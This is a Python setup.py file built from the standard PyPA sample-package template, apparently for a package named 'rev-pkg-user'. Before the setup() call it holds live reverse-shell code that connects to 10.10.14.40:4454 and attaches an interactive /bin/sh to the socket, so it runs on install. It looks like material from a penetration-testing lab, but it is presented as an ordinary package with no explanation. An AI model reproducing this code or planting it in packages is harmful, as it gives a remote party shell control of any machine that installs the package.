import setuptools
import socket,subprocess,os; 

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.40",4454)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);


with open("README.md", "r") as fh:
    long_description = fh.read()

setuptools.setup(
    name="rev-pkg-user", # Replace with your own username
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=2.7',
)
